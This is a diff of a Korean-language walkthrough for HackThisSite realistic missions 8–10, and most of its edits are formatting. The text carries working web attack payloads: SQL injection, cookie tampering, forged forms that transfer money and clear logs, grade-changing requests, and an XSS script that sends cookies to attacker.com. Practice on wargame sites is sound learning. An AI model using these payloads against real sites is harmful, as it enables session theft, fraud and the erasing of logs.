@@ -154,7 +154,7 @@ http://www.hackthissite.org/missions/realistic/7/images/ 에서 보면 파일 �
 
 ![7_images_list.png](images/7_images_list.png)
 
-리스트에서 admin을 클릭하여 http://www.hackthissite.org/missions/realistic/7/images/admin 에 접속하려고 하니 사용자 이름과 비밀번호를 입력하라고 한다. 여기에 접속하는 것이 관건인 듯...
+리스트에서 admin을 클릭하여 http://www.hackthissite.org/missions/realistic/7/images/admin에 접속하려고 하니 사용자 이름과 비밀번호를 입력하라고 한다. 여기에 접속하는 것이 관건인 듯...
 
 이미지 파일 불러올 때 아래와 같이 불러온다.
 ```text
@@ -216,7 +216,7 @@ ID: administrator, password: shadow
 -. Find the account of Gary Hunter (I don't know his account name
   - --> GaryWilliamHunter
 2. Move the $10,000,000 into the account dropCash.
-3. Clear The Logs, They're held in the folder 'logFiles'. © All Rights Reserved (Linkback is required) linkback 필요하다는 것 생각해두기
+3. Clear The Logs, They're held in the folder 'logFiles'. © All Rights Reserved(Linkback is required) linkback 필요하다는 것 생각해두기
 
 ### 문제해결
 - form-post방식, 클릭하면 login2.php로 이동
@@ -226,28 +226,38 @@ ID: administrator, password: shadow
 - user info
   + 18글자만 입력 가능
 - search.php -> search2.php
-  + POST방식 '를 넣으면 인젝션 취약점 있는듯
+  + POST방식: '를 넣어보니 인젝션 취약점 있는듯
 - 아이디를 넣으면 memo에 있는 내용이 출력됨
 - `' or 1=1` 입력했더니 아이디랑 메모 나옴
 - 의심가는 사람: GaryWilliamHunter : -- $$$$$ --
 - 다 포스트방식이므로 javascript넣어야 할듯
 - `javascript:alert(document.cookie)`
   + `ihateboa/123`으로 로그인 후 쿠키 보면 아래와 같음
-	![boa](images/8_boa.png)
+
+![boa](images/8_boa.png)
 	http://www.hackthissite.org/missions/realistic/8/login2.php
+
 - 돈 먼저 옮기고, 로그삭제
   + `javascript:document.cookie="accountUsername=GaryWilliamHunter;"`
   + 아무 아이디나 로그인 한 상태에서 id만 게리헌터로 쿠키 변조
 
-- 돈 옮기기
+- 돈 옮기기
 ```javascript
-javascript:document.write("<form action='movemoney.php' method='POST'> <input type='submit' value='Move Money To A Different Account'> <input type='text' name='TO' value='dropCash'> <input type='text' name='AMOUNT' value='10000000'> </form>")
+javascript:document.write("
+<form action='movemoney.php' method='POST'>
+	<input type='submit' value='Move Money To A Different Account'>
+	<input type='text' name='TO' value='dropCash'>
+	<input type='text' name='AMOUNT' value='10000000'>
+</form>")
 ```
 
-- 로그 지우기
+- 로그 지우기
 ```javascript
-javascript:document.write("<form action='cleardir.php' method='POST'> <input type='hidden' name='dir' value='logFiles'> <input type='submit' value='Clear Files In Personal Folder'></form>
-</form>")
+javascript:document.write("
+<form action='cleardir.php' method='POST'>
+	<input type='hidden' name='dir' value='logFiles'>
+	<input type='submit' value='Clear Files In Personal Folder'>
+	</form>")
 ```
 
 ## Level 9. CrappySoft Software
@@ -255,7 +265,7 @@ javascript:document.write("<form action='cleardir.php' method='POST'> <input ty
 - 상사의 계정으로 들어가서 online payment system에 접속하기
   + 일단은 본인 아이디 사용하기
 	+ Username: r-conner@crappysoft.com Password: ilovemywork
-- Demo에 보면 프로그램 다운받을 수 있고, 실행시켜보면 아래와 같이 오류메시지가 뜨고 관리자 아이디가 나온다.
+- Demo에 보면 프로그램 다운받을 수 있고, 실행시켜보면 아래와 같이 오류메시지가 뜨고 관리자 아이디가 나온다.
 ![9_crappy-soft-software.png](images/9_crappy-soft-software.png)
 
 - 상사 이메일은 메시지 보내기에서 확인 가능하므로, 특별히 얻을 정보 없음
@@ -265,7 +275,10 @@ javascript:document.write("<form action='cleardir.php' method='POST'> <input ty
 #### 세션하이잭킹
 
 ```html
-<script> url="http://attacker.com/getCookie.php?cookie="+document.cookie;window.open(url,width-0,height=-;</script>
+<script>
+  url="http://attacker.com/getCookie.php?cookie="+document.cookie;
+	window.open(url,width-0,height=-;
+</script>
 ```
 
 - 위 스크립트를 private message로 보내면 아래 정보 나온다.
@@ -320,12 +333,20 @@ http://www.hackthissite.org/missions/realistic/10/student.php?uusername=Zach San
 ```
 ```
 http://www.hackthissite.org/missions/realistic/10/student.php?uusername=Jonathan Goodman;&ppassword=
-```
+```
 
 ```javascript
 javascript:document.write("
-<form action=/missions/basic/4/level4.php method=post> <input type=hidden name=to value=sam2@hsite.abc /><input type=submit value=Send password to Sam /></form></center><br /><br /><center><b>Password:</b><br /> <form action=/missions/basic/4/index.php method= post> <input type=password name=password  /><br /><br /> <input type=submit value=submit /></form>
-")
+<form action=/missions/basic/4/level4.php method=post>
+  <input type=hidden name=to value=sam2@hsite.abc />
+	<input type=submit value=Send password to Sam />
+</form>
+</center><br /><br />
+<center><b>Password:</b><br />
+
+<form action=/missions/basic/4/index.php method= post>
+  <input type=password name=password  /><br /><br />
+	<input type=submit value=submit /></form>")
 ```
 
 - id=1번, id/pw 동일함
@@ -339,14 +360,14 @@ smiller / smiller
 
 Welcome, Mrs. Samantha Miller! Please remember that access to the staff administration area is restricted to the district-supplied 'holy_teacher' web browser.
 - 웹브라우저가 holy_teacher웹브라우저인 경우에만 접속 가능
-
+
 접속한 브라우저 확인
 ```javascript
 javascript:alert(navigator.userAgent)
 ```
 - 익스플로러-도구-개발자도구-도구-사용자에이전트문자열변경-사용자지정-holy_teacher로 변경
-
-이번에는 아래와 같은 메시지 나옴.
+
+이번에는 아래와 같은 메시지 나옴
 - note:you are not an administrator so you cannot change grades
 
 권한변경해주기
@@ -358,8 +379,7 @@ javascript:document.cookie="admin=1;"
 - submit grades
 
 Sorry, Mrs. Samantha Miller, it is too late into the school year to change grades now.
-```
-Change Grades의 소스보기에서바꿀 내용의 form 보고 get방식의 코드 작성해줌(post방식으로는 안됨)
+- Change Grades의 소스보기에서바꿀 내용의 form 보고 get방식의 코드 작성해줌(post방식으로는 안됨)
 ```
 #### GRADE1
 http://www.hackthissite.org/missions/realistic/10/staff.php?action=changegrades&changeaction=modrec&rec=0&studentid=1&grade=5&comments=HACKED
